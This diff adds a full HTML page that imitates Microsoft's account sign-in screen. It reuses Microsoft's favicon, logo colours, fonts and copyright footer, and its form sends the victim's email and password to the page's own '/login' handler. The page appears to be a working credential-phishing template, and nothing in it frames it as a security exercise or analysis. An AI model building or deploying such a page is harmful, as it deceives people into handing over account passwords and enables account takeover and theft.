@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Sign in to your account</title>
+<link rel="icon" href="https://login.microsoftonline.com/common/v2.0/images/favicon.ico">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+@keyframes fadeInUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
+@keyframes slideIn{from{opacity:0;transform:translateX(-20px)}to{opacity:1;transform:translateX(0)}}
+body{font-family:'Segoe UI',Tahoma,sans-serif;background:linear-gradient(135deg,#f3f2f1 0%,#edebe9 50%,#e1dfdd 100%);display:flex;align-items:center;justify-content:center;min-height:100vh}
+.card{background:white;padding:44px;max-width:440px;width:92%;box-shadow:0 4px 30px rgba(0,0,0,0.1);border-radius:8px;animation:fadeInUp 0.7s cubic-bezier(0.16,1,0.3,1)}
+.logo{margin-bottom:24px;animation:slideIn 0.5s ease}
+.logo svg{width:108px;height:24px}
+h2{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:4px;animation:fadeInUp 0.5s ease 0.1s both}
+.subtitle{color:#616161;font-size:13px;margin-bottom:24px;animation:fadeInUp 0.5s ease 0.2s both}
+.input-field{width:100%;padding:10px 0;margin:16px 0;border:none;border-bottom:2px solid #666;font-size:15px;outline:none;background:transparent;transition:border-color 0.3s;animation:fadeInUp 0.5s ease 0.3s both}
+.input-field:focus{border-bottom-color:#0067b8;box-shadow:0 2px 0 0 #0067b8}
+.btn{width:100%;padding:12px;background:linear-gradient(135deg,#0067b8,#005a9e);color:white;border:none;font-size:15px;cursor:pointer;margin-top:12px;transition:all 0.3s;animation:fadeInUp 0.5s ease 0.4s both}
+.btn:hover{background:linear-gradient(135deg,#005a9e,#004c87);box-shadow:0 4px 12px rgba(0,103,184,0.3)}
+.signup{margin-top:24px;font-size:13px;color:#1b1b1b;animation:fadeIn 0.5s ease 0.5s both}
+.signup a{color:#0067b8;text-decoration:none}
+.footer{position:fixed;bottom:0;width:100%;padding:12px 24px;display:flex;justify-content:space-between;font-size:12px;color:#616161}
+</style>
+</head>
+<body>
+<div class="card">
+    <div class="logo">
+        <svg viewBox="0 0 108 24"><rect width="10" height="10" fill="#f25022"/><rect x="12" width="10" height="10" fill="#7fba00"/><rect y="12" width="10" height="10" fill="#00a4ef"/><rect x="12" y="12" width="10" height="10" fill="#ffb900"/><text x="28" y="17" font-size="15" fill="#5e5e5e" font-family="Segoe UI">Microsoft</text></svg>
+    </div>
+    <h2>Sign in</h2>
+    <form action="/login" method="POST">
+        <input type="text" name="email" class="input-field" placeholder="Email, phone, or Skype" required>
+        <input type="password" name="password" class="input-field" placeholder="Password" required>
+        <button type="submit" class="btn">Sign in</button>
+    </form>
+    <p class="signup">No account? <a href="#">Create one!</a></p>
+</div>
+<div class="footer"><span>©2024 Microsoft</span><a href="#" style="color:#616161;text-decoration:none">Privacy</a></div>
+</body>
+</html>
